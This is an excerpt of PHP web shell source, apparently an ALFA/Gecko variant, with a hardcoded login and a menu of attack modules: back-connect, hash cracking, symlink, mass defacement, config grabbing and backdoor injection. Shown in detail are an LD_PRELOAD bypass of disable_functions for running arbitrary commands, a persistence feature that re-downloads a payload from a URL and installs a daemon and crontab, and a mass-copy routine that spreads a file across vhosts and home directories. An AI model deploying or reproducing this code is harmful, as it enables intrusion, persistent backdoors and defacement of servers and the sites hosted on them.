...
'username' => 'root',
'password' => '3cad96982b7aef9b8774627962ef9ed3',//md5(ehsan)
'safe_mode' => '1',
'login_page' => '404',
'show_icons' => '',
...
function geckoMassCopyRun($src, $base, $debug = false, $v2 = false, $limit = 0, $offset = 0, $v3 = false, $mode = '')
{
    ...
    $limit = (int)$limit;
    $offset = (int)$offset;
    // limit <= 0 = process all targets (no batch cap)
...
function geckoBypassRun($cmd)
{
    ...
    // Prefer cwd/shm — /tmp often noexec so LD_PRELOAD .so never loads
    ...
    $mailOk = false;
    try {
        // Same as preload.php — empty args
        $mailOk = @mail('', '', '', '');
    } catch (Exception $ex) {
        $mailOk = false;
    } catch (Throwable $ex) {
...
<ul>
';
$li = array('proc'=>'Proc','phpeval'=>'Eval','sql'=>'SQL','connect'=>'BC','safe'=>'Bypass','cgishell'=>'Cgi','cpcrack'=>'Hash','basedir'=>'BaseDir','pwchanger'=>'Addmin','ShellInjectors'=>'Inject','symlink'=>'Symlink','MassDefacer'=>'Mass','searcher'=>'Search','config_grabber'=>'Config','inbackdoor'=>'Inject','geckoRecover'=>'Recover','geckoBypass'=>'Preload','geckoMassCopy'=>'MassCopy','selfrm'=>'killme'
);
...
function Alfa_Searcher_ClickableDir($path)
{
    ...
    // ALFA FilesMan expects trailing slash on folder paths
    $nav = ($path === '/') ? '/' : ($path . '/');
    $js = str_replace(array('\\', "'"), array('\\\\', "\\'"), $nav);
    $label = htmlspecialchars($path, ENT_QUOTES, 'UTF-8');
    return '<a href="javascript:void(0)" class="alfa-search-dir" style="color:#7CFC00;text-decoration:underline;cursor:pointer" title="Open in File Manager" onclick="g(\'FilesMan\',\''.$js.'\');return false;">'.$label.'</a>';
}
...
if (!is_array($globDirs)) $globDirs = array();
$blacklist = array();
foreach ($globDirs as $subDir) {
if(!@is_readable($subDir)||@is_link($subDir)) continue;
@Alfa_Searcher($subDir, $ext, $method);
}
switch($method){
case "files":
foreach ($globFiles as $file){
...
break;
case "dirs":
// List writable directories directly (not only parents of matching files)
foreach ($globDirs as $dpath) {
if (!@is_readable($dpath) || @is_link($dpath)) continue;
if (!@is_writable($dpath)) continue;
$norm = str_replace('\\', '/', $dpath);
if (in_array($norm, $blacklist, true)) continue;
echo Alfa_Searcher_ClickableDir($norm).'<br>';
$blacklist[] = $norm;
}
break;
case "all":
...
/** ===== Gecko features (from manager.php) — ALFA UI wrappers ===== */
function alfageckoRecover(){
alfahead();
AlfaNum(5,6,7,8,9,10);
if (!isset($GLOBALS['baseDir'])) $GLOBALS['baseDir'] = isset($GLOBALS['cwd']) ? $GLOBALS['cwd'] : getcwd();
echo "<div class=header><center><p><div class='txtfont_header'>| Auto Recover + Persistence |</div></p>";
echo '<div class="txtfont" style="opacity:.85;margin-bottom:6px;">engine: '.(function_exists('geckoRecoverTarget') ? 'embedded OK' : 'NOT LOADED — re-upload header.php').'</div>';
echo "<form onSubmit=\"g('geckoRecover',null,this.dir.value,this.file.value,this.url.value,this.persist.value,'>>');return false;\" method='post'>";
echo '<div class="txtfont">DIR_PATH: <input size="55" type="text" name="dir" value="'.htmlspecialchars($GLOBALS['cwd']).'"><br>';
echo 'FILE_NAME: <input size="30" type="text" name="file" value="index.php"><br>';
echo 'DOWNLOAD_URL: <input size="55" type="text" name="url" value=""><br>';
echo 'Persist: <select name="persist"><option value="1">ON (daemon+crontab)</option><option value="0">OFF (one-shot)</option></select>';
echo ' <input type="submit" value=" Recover "></div></form></center>';
if (isset($_POST['alfa5']) && $_POST['alfa5'] === '>>') {
    if (!function_exists('geckoRecoverTarget')) {
        echo __pre().'<b>Recover engine NOT LOADED. Upload the latest header.php only (tools are already embedded — do not use an old copy that still asks for gecko_tools.php).</b>';
    } else {
        $dir = trim((string)$_POST['alfa1']);
        $file = trim((string)$_POST['alfa2']);
        $url = trim((string)$_POST['alfa3']);
        $persist = (string)$_POST['alfa4'];
        $wantPersist = ($persist === '1' || $persist === 'true');
        $r = geckoRecoverTarget($dir, $file, $url, true);
        echo __pre();
        echo htmlspecialchars(isset($r['message']) ? $r['message'] : (empty($r['ok']) ? 'FAIL' : 'OK'))."\n";
        if (!empty($r['steps']) && is_array($r['steps'])) {
            foreach ($r['steps'] as $s) echo htmlspecialchars((string)$s)."\n";
        }
        if (!empty($r['ok']) && $wantPersist && function_exists('geckoRecoverDeployPersistence')) {
            $p = geckoRecoverDeployPersistence($dir, $file, $url);
            echo "\n--- persistence ---\n";
            echo htmlspecialchars(isset($p['message']) ? $p['message'] : '')."\n";
            if (!empty($p['steps']) && is_array($p['steps'])) {
                foreach ($p['steps'] as $s) echo htmlspecialchars((string)$s)."\n";
            }
            echo 'crontab: '.(empty($p['crontab']) ? 'MISSING' : 'OK')."\n";
            echo 'pid: '.(isset($p['pid']) ? (int)$p['pid'] : 0)."\n";
            echo 'tmp: '.(isset($p['install_path']) ? $p['install_path'] : '')."\n";
            echo 'shm: '.(isset($p['shm_path']) ? $p['shm_path'] : '')."\n";
        }
    }
}
echo '</div>';
...
function alfageckoBypass(){
alfahead();
AlfaNum(5,6,7,8,9,10);
echo "<div class=header><center><p><div class='txtfont_header'>| Bypass disable_functions (LD_PRELOAD) |</div></p>";
echo "<form onSubmit=\"g('geckoBypass',null,this.cmd.value,'>>');return false;\" method='post'>";
echo '<div class="txtfont">CMD: <input size="60" type="text" name="cmd" value="id"> <input type="submit" value=" Run "></div></form></center>';
if (isset($_POST['alfa2']) && $_POST['alfa2'] === '>>') {
    if (!function_exists('geckoBypassRun')) {
        echo __pre().'<b>Preload payload missing (embed failed)</b>';
    } else {
        $cmd = trim((string)$_POST['alfa1']);
        $r = geckoBypassRun($cmd);
        echo __pre();
        echo htmlspecialchars(isset($r['message']) ? $r['message'] : '')."\n";
        if (!empty($r['error'])) echo 'error: '.htmlspecialchars($r['error'])."\n";
        if (isset($r['mail_ok'])) echo 'mail_ok: '.(!empty($r['mail_ok']) ? 'yes' : 'no')."\n";
        if (!empty($r['workdir'])) echo 'workdir: '.htmlspecialchars((string)$r['workdir'])."\n";
        if (isset($r['output'])) echo "\n".htmlspecialchars((string)$r['output']);
    }
}
echo '</div>';
alfafooter();
...
function alfageckoMassCopy(){
alfahead();
AlfaNum(5,6,7,8,9,10);
echo "<div class=header><center><p><div class='txtfont_header'>| Mass Copy (v1 / v2 / v3) |</div></p>";
echo "<form id='gecko_mc_form' onSubmit=\"var m=this.mode.value;var b=(m==='v1'?this.base.value:'');g('geckoMassCopy',null,this.src.value,b,m,'>>');return false;\" method='post'>";
echo '<div class="txtfont">SRC file: <input size="55" type="text" name="src" value="'.htmlspecialchars($GLOBALS['cwd']).'"><br>';
echo '<span id="gecko_mc_base_row">Base (v1 only): <input size="55" type="text" name="base" id="gecko_mc_base" value="/home"><br></span>';
echo 'Mode: <select name="mode" id="gecko_mc_mode" onchange="geckoMcToggleBase(this.value)"><option value="v1">v1 folder</option><option value="v2">v2 system/symlink</option><option value="v3">v3 vhost</option></select> ';
echo '<input type="submit" value=" Copy "></div></form></center>';
echo '<script type="text/javascript">
function geckoMcToggleBase(m){
var row=document.getElementById("gecko_mc_base_row");
var inp=document.getElementById("gecko_mc_base");
if(!row)return;
if(m==="v1"){
row.style.display="";
...
(function(){
var sel=document.getElementById("gecko_mc_mode");
if(sel)geckoMcToggleBase(sel.value);
})();
</script>';
if (isset($_POST['alfa4']) && $_POST['alfa4'] === '>>') {
    if (!function_exists('geckoMassCopyRun')) {
        echo __pre().'<b>Gecko masscopy engine missing (embed failed)</b>';
    } else {
        $src = trim((string)$_POST['alfa1']);
        $base = trim((string)$_POST['alfa2']);
        $mode = trim((string)$_POST['alfa3']);
        if ($mode !== 'v1' && $mode !== 'v2' && $mode !== 'v3') $mode = 'v1';
        $v2 = ($mode === 'v2');
        $v3 = ($mode === 'v3');
        if ($mode === 'v1') {
            if ($base === '') $base = '/home';
        ...
        echo __pre();
        echo htmlspecialchars(isset($r['message']) ? $r['message'] : (empty($r['ok'])?'FAIL':'OK'))."\n";
        echo 'mode: '.htmlspecialchars($mode)."\n";
        if ($mode === 'v1') echo 'base: '.htmlspecialchars($base)."\n";
        if (!empty($r['error'])) echo 'error: '.htmlspecialchars($r['error'])."\n";
        if (isset($r['domain_count'])) echo 'targets: '.(int)$r['domain_count']."\n";
        if (isset($r['confirmed'])) echo 'confirmed: '.(int)$r['confirmed']."\n";
        if (!empty($r['urls']) && is_array($r['urls'])) {
            echo "\n-- confirmed URLs --\n";
            foreach ($r['urls'] as $u) echo htmlspecialchars((string)$u)."\n";
        }
        if (!empty($r['details']) && is_array($r['details'])) {
            echo "\n-- details --\n";
            foreach ($r['details'] as $row) {
                echo htmlspecialchars(is_array($row) ? json_encode($row) : (string)$row)."\n";
            }
        }
        if (!empty($r['debug_log']) && is_array($r['debug_log'])) {
            echo "\n-- debug --\n";
            foreach ($r['debug_log'] as $line) echo htmlspecialchars((string)$line)."\n";
        }
    }
}
echo '</div>';
